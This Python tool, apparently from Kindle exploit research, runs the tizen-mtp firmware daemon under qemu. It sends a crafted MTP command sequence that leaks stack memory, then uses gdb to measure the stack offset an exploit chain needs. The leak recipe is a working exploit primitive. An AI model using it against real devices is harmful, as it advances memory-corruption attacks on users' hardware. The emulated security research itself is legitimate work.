#!/usr/bin/env python3
"""stackdelta: measure the receiver-frame/stack-anchor delta of tizen-mtp.

Runs the genuine firmware binary under qemu-arm with a fake functionfs
transport and the deterministic offline leak recipe, then captures in one
process:

  anchor : the stack value leaked at slot+16 of the n=9 leak
  S      : the command thread's sp inside FUN_0002fcf0 (the RX copy routine)
  delta  : anchor - S   (0xCD8 for Kindle Basic 5 2024 / 5.19.6)

The 12-byte "/mnt/base-us" store path is made to resolve without patching the
binary: qemu runs inside an unprivileged mount namespace where the host path
/mnt/base-us is a bind mount of the guestroot store directory.

Usage:
  tools/stackdelta/measure.py --mtp <tizen-mtp> --rootfs <extracted rootfs> \
      --workdir <dir> --out <json> [--expect-delta 0xCD8] [--timeout 120]

Requires: qemu-arm, gdb-multiarch, arm-linux-gnueabihf-gcc, unshare (util-linux),
and an extracted rootfs tree of the firmware (ext4get -extract-all).
"""
import argparse
import errno
import hashlib
import json
import os
import re
import select
import shutil
import stat
import struct
import subprocess
import sys
import time

REPO = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
DEFAULT_RX_COPY_SITE = 0x1FCF0
DEFAULT_INJECT_EVENT_FN = 0x189D4
MAX_FRAME_DELTA = 0x10000
LEAK_PROP = 0xDC08
CMD, DATA, RESP = 1, 2, 3


def free_port():
    import socket
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def log(msg):
    print(msg, flush=True)


def fail(msg, code=1):
    log("stackdelta: " + msg)
    sys.exit(code)


def container(typ, code, tid, payload=b""):
    return struct.pack("<IHHI", 12 + len(payload), typ, code, tid) + payload


def cmd(code, tid, params=()):
    return container(CMD, code, tid, b"".join(struct.pack("<I", p) for p in params))


def data(code, tid, payload=b""):
    return container(DATA, code, tid, payload)


def parse_container(pkt):
    ln, typ, code, tid = struct.unpack_from("<IHHI", pkt, 0)
    return typ, code, tid, pkt[12:ln]


def mtp_string(text):
    if not text:
        return b"\x00"
    raw = text.encode("utf-16-le") + b"\x00\x00"
    return bytes([len(raw) // 2]) + raw


def object_info(storage_id, fmt, parent, name, size=0, assoc_type=0):
    fixed = struct.pack("<IHHIHIIIIIIIHII", storage_id, fmt, 0, size, 0, 0,
                        0, 0, 0, 0, 0, parent, assoc_type, 0, 0)
    return (fixed + mtp_string(name) + mtp_string("") + mtp_string("")
            + mtp_string(""))


def elf_text(path):
    data = open(path, "rb").read()
    if data[:4] != b"\x7fELF" or data[4] != 1 or data[5] != 1:
        fail("tizen-mtp is not ELF32 LE (unsupported build)", 3)
    e_shoff, = struct.unpack_from("<I", data, 0x20)
    e_shentsize, = struct.unpack_from("<H", data, 0x2E)
    e_shnum, = struct.unpack_from("<H", data, 0x30)
    e_shstrndx, = struct.unpack_from("<H", data, 0x32)
    secs = []
    for i in range(e_shnum):
        o = e_shoff + i * e_shentsize
        vals = struct.unpack_from("<IIIIIIIIII", data, o)
        secs.append({"name_off": vals[0], "addr": vals[3], "off": vals[4],
                     "size": vals[5]})
    shstr = secs[e_shstrndx]
    for sec in secs:
        end = data.index(b"\x00", shstr["off"] + sec["name_off"])
        sec["name"] = data[shstr["off"] + sec["name_off"]:end].decode()
    for sec in secs:
        if sec["name"] == ".text":
            return data, sec
    fail("no .text section (unsupported build)", 3)


def check_anchor(data, text, name, va):
    if va % 2 or not (text["addr"] <= va < text["addr"] + text["size"]):
        fail("%s %#x is outside .text (unsupported build)" % (name, va), 3)
    off = text["off"] + (va - text["addr"])
    return {"addr": hex(va), "fingerprint": data[off:off + 16].hex()}


def tool_version(cmd):
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        first = (out.stdout or out.stderr).splitlines()
        return first[0].strip() if first else ""
    except Exception:
        return ""


class Transport:
    def __init__(self, guestroot, logpath, deadline=10.0):
        self.ep_in = os.path.join(guestroot, "dev/usb-ffs/mtp/ep1")
        self.ep_out = os.path.join(guestroot, "dev/usb-ffs/mtp/ep2")
        end = time.time() + deadline
        fd = None
        while time.time() < end:
            try:
                fd = os.open(self.ep_out, os.O_WRONLY | os.O_NONBLOCK)
                break
            except OSError as e:
                if e.errno in (errno.ENXIO, errno.ENOENT):
                    time.sleep(0.05)
                    continue
                fail("open %s: %s" % (self.ep_out, e))
        if fd is None:
            fail("no reader on %s after %.0fs (daemon not running?)" % (self.ep_out, deadline), 3)
        os.set_blocking(fd, True)
        self.fout = os.fdopen(fd, "wb", buffering=0)
        self.fin = open(self.ep_in, "rb")
        self.buf = b""
        self.logpath = logpath

    def send(self, pkt):
        self.fout.write(pkt)
        self.fout.flush()

    def recv(self, timeout=1.0):
        out = []
        end = time.time() + timeout
        while time.time() < end:
            r, _, _ = select.select([self.fin], [], [], 0.05)
            chunk = self.fin.read() if r else b""
            if chunk:
                self.buf += chunk
            while len(self.buf) >= 12:
                ln, typ, code, tid = struct.unpack_from("<IHHI", self.buf, 0)
                if len(self.buf) < ln:
                    break
                out.append(self.buf[:ln])
                self.buf = self.buf[ln:]
            if out and not chunk:
                break
            if not chunk:
                time.sleep(0.005)
        return out

    def command(self, code, params=(), tid=1, timeout=1.0):
        self.send(cmd(code, tid, params))
        return self.recv(timeout)

    def close(self):
        for f in (self.fout, self.fin):
            try:
                f.close()
            except Exception:
                pass


def kill_stale_processes():
    devnull = subprocess.DEVNULL
    for name in ("qemu-arm", "gdb-multiarch"):
        subprocess.run(["pkill", "-9", "-x", name], stdout=devnull, stderr=devnull)
    for _ in range(40):
        if subprocess.run(["pgrep", "-x", "qemu-arm"], stdout=devnull).returncode != 0:
            return
        time.sleep(0.1)
    fail("stale qemu-arm processes survive pkill")


def build_environment(rootfs, workdir):
    kill_stale_processes()
    stub = os.path.join(workdir, "mtpstub")
    guestroot = os.path.join(workdir, "guestroot")
    for script, args in (("harness/tools/preloads/build.sh", [stub, rootfs]),
                         ("harness/tools/setup_guestroot.sh", [guestroot, rootfs])):
        p = subprocess.run([os.path.join(REPO, script)] + args,
                           capture_output=True, text=True)
        if p.returncode != 0:
            fail("%s failed:\n%s%s" % (script, p.stdout, p.stderr))
    store = os.path.join(guestroot, "mnt/base-us")
    shutil.rmtree(store, ignore_errors=True)
    os.makedirs(os.path.join(store, "droid/media"), exist_ok=True)
    mtp_dev = os.path.join(guestroot, "dev/usb-ffs/mtp")
    ep1, ep2 = os.path.join(mtp_dev, "ep1"), os.path.join(mtp_dev, "ep2")
    if os.path.lexists(ep1):
        os.unlink(ep1)
    open(ep1, "wb").close()
    if not os.path.lexists(ep2) or not stat.S_ISFIFO(os.stat(ep2).st_mode):
        if os.path.lexists(ep2):
            os.unlink(ep2)
        os.mkfifo(ep2)
    return stub, guestroot


def qemu_command(mtp, guestroot, gdb_port, inject_off):
    if os.environ.get("SD_IN_NS") == "1":
        return direct_qemu_command(mtp, guestroot, gdb_port, inject_off)
    helperpatch = os.path.join(os.path.dirname(guestroot), "helperpatch")
    stub = os.path.join(os.path.dirname(guestroot), "mtpstub")
    ldpath = "%s:%s:%s" % (stub, os.path.join(guestroot, "lib"), os.path.join(guestroot, "usr/lib"))
    preload = ":".join(os.path.join(stub, s + ".so")
                       for s in ("inject", "bridge", "syslog_spy"))
    store = os.path.join(guestroot, "mnt/base-us")
    inner = ("mount -t tmpfs none /mnt && mkdir -p /mnt/base-us && "
             "mount --bind %(store)s /mnt/base-us && "
             "exec qemu-arm -g %(port)d -L %(root)s "
             "-E LD_LIBRARY_PATH=%(ldpath)s -E LD_PRELOAD=%(preload)s "
             "-E SD_STORE_PREFIX=%(root)s -E MTP_INJECT_OFF=%(inject)s %(mtp)s -f"
             % {"store": shlex_quote(store), "port": gdb_port,
                "root": shlex_quote(guestroot), "ldpath": shlex_quote(ldpath),
                "preload": shlex_quote(preload), "mtp": shlex_quote(mtp),
                "inject": hex(inject_off)})
    return ["unshare", "-rm", "sh", "-c", inner]


def direct_qemu_command(mtp, guestroot, gdb_port, inject_off):
    stub = os.path.join(os.path.dirname(os.path.abspath(guestroot)), "mtpstub")
    ldpath = "%s:%s:%s" % (stub, os.path.join(guestroot, "lib"),
                           os.path.join(guestroot, "usr/lib"))
    preload = ":".join(os.path.join(stub, s + ".so")
                       for s in ("inject", "bridge", "syslog_spy"))
    return ["qemu-arm", "-g", str(gdb_port), "-L", guestroot,
            "-E", "LD_LIBRARY_PATH=" + ldpath, "-E", "LD_PRELOAD=" + preload,
            "-E", "SD_STORE_PREFIX=" + guestroot,
            "-E", "MTP_INJECT_OFF=%#x" % inject_off, mtp, "-f"]


def shlex_quote(s):
    import shlex
    return shlex.quote(s)


def wait_for_base(pid, timeout=10.0):
    end = time.time() + timeout
    while time.time() < end:
        try:
            with open("/proc/%d/maps" % pid) as f:
                for line in f:
                    if "tizen-mtp" in line and line.split()[-1].endswith("tizen-mtp"):
                        return int(line.split("-")[0], 16)
        except FileNotFoundError:
            return None
        time.sleep(0.05)
    return None


def read_regions(pid):
    regions = []
    try:
        with open("/proc/%d/maps" % pid) as f:
            for line in f:
                p = line.split()
                if len(p) < 2 or "r" not in p[1]:
                    continue
                a, b = p[0].split("-")
                regions.append((int(a, 16), int(b, 16), p[5] if len(p) > 5 else "[anon]"))
    except FileNotFoundError:
        pass
    return regions


def run_gdb(gdb_port, guestroot, mtp, base, gdb_log, rx_copy_site):
    script = os.path.join(os.path.dirname(gdb_log), "stackdelta.gdb")
    with open(script, "w") as f:
        f.write("set pagination off\nset confirm off\n"
                "set sysroot %s\nfile %s\ntarget remote :%d\n"
                "break *%#x\ncommands\nsilent\n"
                "printf \"FRAME sp=%%#x r7=%%#x lr=%%#x src=%%#x dst=%%#x len=%%u\\n\", "
                "$sp, $r7, $lr, $r0, $r1, *(unsigned int*)$r0\n"
                "continue\nend\ncontinue\n" % (guestroot, mtp, gdb_port, base + rx_copy_site))
    out = open(gdb_log, "wb")
    return subprocess.Popen(["gdb-multiarch", "-nx", "-q", "-x", script],
                            stdin=subprocess.DEVNULL, stdout=out,
                            stderr=subprocess.STDOUT), out


def leak(h, handle, prop, record=None):
    pay = None
    for pk in h.command(0x9803, [handle, prop]):
        t, c, tid, pl = parse_container(pk)
        if t == DATA:
            pay = pl
    if record is not None:
        record["payload"] = pay
    if not pay or not pay[0]:
        return None
    return pay[1:1 + 2 * pay[0]]


def make(h, name, parent=0xFFFFFFFF, fmt=0x3001, size=0):
    h.send(cmd(0x100C, 1, [0, parent, 0]))
    time.sleep(0.05)
    assoc = 1 if fmt == 0x3001 else 0
    h.send(data(0x100C, 1, object_info(0, fmt, parent, name, size, assoc)))
    resp = [p for p in h.recv(1.0) if parse_container(p)[0] == RESP]
    if not resp:
        fail("no response creating %r" % name[:12])
    code = parse_container(resp[-1])[1]
    if code != 0x2001:
        fail("create %r -> 0x%x" % (name[:12], code))
    return struct.unpack_from("<I", parse_container(resp[-1])[3], 8)[0]


def run_recipe(h, extra=9):
    pkts = h.command(0x1002, [1], tid=0)
    if not any(parse_container(p)[1] == 0x2001 for p in pkts):
        fail("OpenSession failed")
    for k in range(extra):
        make(h, "dummy%d" % k)
    a = make(h, "A" * 199)
    b = make(h, "B" * 199, parent=a)
    p = make(h, "P" * 199, parent=b)
    f = make(h, "F" * 245)
    make(h, "C" * 200, parent=f)
    real = make(h, "real")
    child = make(h, "wxyz", parent=real)
    h.command(0x1019, [f, 0x10001, p])
    ghost = make(h, "aaaaaaaaTaaaaaaaaaaa", fmt=0x3801)

    ops = [("handlesRoot", [0x10001, 0, 0xFFFFFFFF]),
           ("handlesReal", [0x10001, 0, real]),
           ("handlesChild", [0x10001, 0, child]),
           ("handlesAll", [0x10001, 0, 0])]
    last = None
    for tag, params in ops:
        h.command(0x1007, params)
        record = {}
        raw = leak(h, ghost, LEAK_PROP, record)
        pay = record.get("payload")
        last = (tag, len(pay) if pay else 0, pay[0] if pay else None)
        if raw and len(raw) // 2 >= 8:
            return tag, raw, last
    return None, None, last


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mtp", required=True)
    ap.add_argument("--rootfs", required=True)
    ap.add_argument("--workdir", required=True)
    ap.add_argument("--out", required=True)
    ap.add_argument("--expect-delta", type=lambda s: int(s, 0), default=None,
                    help="optional reference value; only sets matches_expected "
                         "and makes a mismatch exit nonzero")
    ap.add_argument("--rx-copy-site", type=lambda s: int(s, 0),
                    default=DEFAULT_RX_COPY_SITE,
                    help="RX copy helper entry (fwderive rx_copy)")
    ap.add_argument("--inject-event-fn", type=lambda s: int(s, 0),
                    default=DEFAULT_INJECT_EVENT_FN,
                    help="event writer entry for inject.so (fwderive inject_event)")
    ap.add_argument("--timeout", type=float, default=120.0)
    args = ap.parse_args()

    mtp = os.path.abspath(args.mtp)
    rootfs = os.path.abspath(args.rootfs)
    workdir = os.path.abspath(args.workdir)
    for p, what in ((mtp, "tizen-mtp"), (rootfs, "rootfs")):
        if not os.path.exists(p):
            fail("missing %s: %s" % (what, p))
    if not shutil.which("unshare"):
        fail("unshare (util-linux) is required")
    os.makedirs(os.path.join(workdir, "logs"), exist_ok=True)
    data, text = elf_text(mtp)
    sha = hashlib.sha256(data).hexdigest()
    anchors = {
        "rx_copy": check_anchor(data, text, "rx_copy", args.rx_copy_site),
        "inject_event": check_anchor(data, text, "inject_event", args.inject_event_fn),
    }
    if b"/mnt/base-us" not in data:
        fail("store root /mnt/base-us not present in binary (unsupported build)", 3)

    stub, guestroot = build_environment(rootfs, workdir)
    gdb_log = os.path.join(workdir, "logs/gdb.out")
    port = free_port()
    recipe_log = os.path.join(workdir, "logs/recipe.out")

    proc = subprocess.Popen(qemu_command(mtp, guestroot, port, args.inject_event_fn),
                            stdout=open(os.path.join(workdir, "logs/qemu.out"), "wb"),
                            stderr=open(os.path.join(workdir, "logs/qemu.err"), "wb"))
    try:
        base = wait_for_base(proc.pid)
        if not base:
            fail("tizen-mtp never mapped (see logs/qemu.err)")
        gdb, gdb_out = run_gdb(port, guestroot, mtp, base, gdb_log, args.rx_copy_site)
        time.sleep(2.0)
        h = Transport(guestroot, recipe_log)
        tag, raw, last = run_recipe(h)
        time.sleep(0.3)
        regions = read_regions(proc.pid)
        h.close()
        gdb.terminate()
        try:
            gdb.wait(timeout=5)
        except subprocess.TimeoutExpired:
            gdb.kill()
        gdb_out.close()
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()

    if not raw:
        if last is None:
            fail("leak recipe produced no leak probe results (see %s)" % recipe_log, 3)
        tag, plen, nchars = last
        if nchars == 0:
            fail("no n>=8 leak: DC08 num_chars=0 (empty; timestring residue not controllable on this build's glib stack layout)", 3)
        if nchars is None:
            fail("no n>=8 leak: DC08 returned no data (see %s)" % recipe_log, 3)
        fail("no n>=8 leak: DC08 num_chars=%d (date-time gate rejected the residue)" % nchars, 3)
    anchor = struct.unpack_from("<I", raw, 14)[0]

    candidates = {}
    frames = {}
    try:
        with open(gdb_log, errors="replace") as f:
            for line in f:
                m = re.search(r"FRAME sp=(0x[0-9a-f]+) r7=(0x[0-9a-f]+) lr=(0x[0-9a-f]+) "
                              r"src=(0x[0-9a-f]+) dst=(0x[0-9a-f]+) len=(\d+)", line)
                if m:
                    sp = int(m.group(1), 16)
                    candidates[sp] = candidates.get(sp, 0) + 1
                    frames.setdefault(sp, []).append({
                        "r7": m.group(2), "lr": m.group(3), "src": m.group(4),
                        "dst": m.group(5), "len": int(m.group(6))})
    except FileNotFoundError:
        pass
    if not candidates:
        fail("no receiver frames captured (see %s)" % gdb_log, 3)

    chosen = None
    chosen_region = None
    candidate_info = {}
    fits = []
    for sp, fs in frames.items():
        sigs = {(int(f["r7"], 16) - sp, int(f["dst"], 16) - sp) for f in fs}
        srcs = {f["src"] for f in fs}
        delta = anchor - sp
        candidate_info[hex(sp)] = {
            "frames": len(fs), "frame_sig": sorted("%#x/%#x" % s for s in sigs),
            "distinct_src": len(srcs), "delta": delta,
            "dst_off": int(fs[0]["dst"], 16) - sp,
            "caller_lr": sorted({f["lr"] for f in fs}),
        }
        if not (0 < delta <= MAX_FRAME_DELTA):
            continue
        if len(sigs) != 1:
            fail("frames for sp=%#x have inconsistent layout signatures %s"
                 % (sp, sorted(sigs)))
        fits.append(sp)
    varied = [sp for sp in fits if candidate_info[hex(sp)]["distinct_src"] >= 2]
    if len(fits) == 0:
        fail("no captured sp within %#x below the anchor %#x (candidates: %s)"
             % (MAX_FRAME_DELTA, anchor,
                ", ".join("%#x(d=%#x)" % (s, anchor - s) for s in sorted(frames))))
    if len(varied) != 1:
        fail("expected exactly one transport-thread frame (>=2 RX buffer sources), "
             "got %s among %s" % ([hex(s) for s in varied],
                                  [hex(s) for s in sorted(frames)]))
    chosen = varied[0]
    for start, end, name in regions:
        if start <= chosen < end:
            chosen_region = (start, end, name)
            break
    if chosen_region is None:
        fail("cannot map chosen frame %#x to a region" % chosen)

    delta = anchor - chosen
    checks = {
        "leak_wellformed": bool(raw) and len(raw) >= 16,
        "anchor_in_readable_region": any(a <= anchor < b for a, b, _ in regions),
        "transport_frame_unique": chosen is not None,
        "delta_bounds": 0 < delta <= MAX_FRAME_DELTA,
    }
    verified = all(checks.values())
    matches = None if args.expect_delta is None else (delta == args.expect_delta)

    result = {
        "tizen_mtp_sha256": sha,
        "text": {"addr": hex(text["addr"]), "size": text["size"]},
        "anchors": anchors,
        "host": {
            "qemu": tool_version(["qemu-arm", "--version"]),
            "gdb": tool_version(["gdb-multiarch", "--version"]),
        },
        "anchor": anchor,
        "anchor_hex": hex(anchor),
        "anchor_low12": anchor & 0xFFF,
        "receiver_sp": chosen,
        "receiver_sp_hex": hex(chosen),
        "stack_delta": delta,
        "stack_delta_hex": hex(delta),
        "stack_delta_verified": bool(verified),
        "checks": checks,
        "matches_expected": matches,
        "expected_delta": args.expect_delta,
        "leak_after": tag,
        "leak_raw": raw.hex(),
        "stack_region": {"start": hex(chosen_region[0]), "end": hex(chosen_region[1]),
                         "name": chosen_region[2]},
        "frame_candidates": candidate_info,
    }
    with open(args.out, "w") as f:
        json.dump(result, f, indent=2)
        f.write("\n")
    log("stackdelta: anchor=%#x sp=%#x delta=%#x (%d) verified=%s%s"
        % (anchor, chosen, delta, delta, verified,
           "" if matches is not False else "  [EXPECTED %#x]" % args.expect_delta))
    return 0 if verified and matches is not False else 1


if __name__ == "__main__":
    sys.exit(main())
